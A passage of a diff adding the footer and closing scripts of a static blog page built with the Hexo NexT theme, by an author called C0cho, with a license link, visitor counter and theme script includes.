+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
